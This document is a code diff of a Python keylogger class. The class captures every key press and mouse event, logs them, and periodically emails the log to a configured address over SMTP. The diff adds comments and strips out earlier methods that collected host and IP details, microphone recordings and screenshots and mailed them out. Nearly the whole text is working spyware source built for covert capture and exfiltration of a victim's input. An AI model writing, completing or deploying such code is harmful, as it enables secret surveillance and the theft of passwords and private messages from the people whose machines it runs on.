@@ -12,12 +12,14 @@ from pynput.keyboard import Listener
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
+# Email configuration
 EMAIL_ADDRESS = "your_email@example.com"
 EMAIL_PASSWORD = "your_email_password"
 SEND_REPORT_EVERY = 60  # as in seconds
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
+        # Initialize keylogger with time interval for report sending
         self.interval = time_interval
         self.log = "KeyLogger Started..."
         self.email = email
@@ -25,22 +27,27 @@ class KeyLogger:
         self.running = True  # Flag to control the main loop
 
     def append_log(self, string):
+        # Method to append log messages
         self.log += string
 
     def on_move(self, x, y):
+        # Callback for mouse move event
         logging.info("Mouse moved to {} {}".format(x, y))
         self.append_log(f"Mouse moved to {x}, {y}\n")
 
     def on_click(self, x, y, button, pressed):
+        # Callback for mouse click event
         action = 'Pressed' if pressed else 'Released'
         logging.info(f"{action} {button} at ({x}, {y})")
         self.append_log(f"{action} {button} at ({x}, {y})\n")
 
     def on_scroll(self, x, y, dx, dy):
+        # Callback for mouse scroll event
         logging.info(f"Scrolled {dx} {dy} at ({x}, {y})")
         self.append_log(f"Scrolled {dx} {dy} at ({x}, {y})\n")
 
     def on_press(self, key):
+        # Callback for key press event
         try:
             logging.info(f"Key {key.char} pressed")
             self.append_log(f"Key {key.char} pressed\n")
@@ -49,6 +56,7 @@ class KeyLogger:
             self.append_log(f"Special key {key} pressed\n")
 
     def send_mail(self, message):
+        # Method to send email with logged data
         msg = MIMEMultipart()
         msg['From'] = self.email
         msg['To'] = self.email
@@ -63,57 +71,24 @@ class KeyLogger:
             server.sendmail(self.email, self.email, msg.as_string())
 
     def report(self):
+        # Method to send report via email
         self.send_mail(self.log)
-        self.log = ""
+        self.log = ""  # Clear log after sending
         if self.running:
             threading.Timer(self.interval, self.report).start()
 
-    def system_information(self):
-        hostname = socket.gethostname()
-        ip = socket.gethostbyname(hostname)
-        plat = platform.processor()
-        system = platform.system()
-        machine = platform.machine()
-        self.append_log(f"\nHostname: {hostname}\n")
-        self.append_log(f"IP Address: {ip}\n")
-        self.append_log(f"Processor: {plat}\n")
-        self.append_log(f"System: {system}\n")
-        self.append_log(f"Machine: {machine}\n")
-
-    def microphone(self):
-        fs = 44100
-        seconds = SEND_REPORT_EVERY
-        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
-        sd.wait()
-        wave.write('sound.wav', fs, myrecording)
-
-        with open('sound.wav', 'rb') as f:
-            audio_data = f.read()
-
-        self.send_mail(audio_data)
-
-    def screenshot(self):
-        img = pyscreenshot.grab()
-        img.save("screenshot.png")
-
-        with open("screenshot.png", "rb") as f:
-            screenshot_data = f.read()
-
-        self.send_mail(screenshot_data)
-
     def start(self):
-        # Start reporting
+        # Start reporting thread and keyboard listener
         self.report()
-
-        # Start keyboard listener
         with Listener(on_press=self.on_press) as keyboard_listener:
             keyboard_listener.join()
 
     def stop(self):
+        # Stop keylogger
         self.running = False
 
 if __name__ == "__main__":
-    # Set up logging
+    # Set up logging configuration
     logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s - %(message)s')
 
     # Create KeyLogger instance
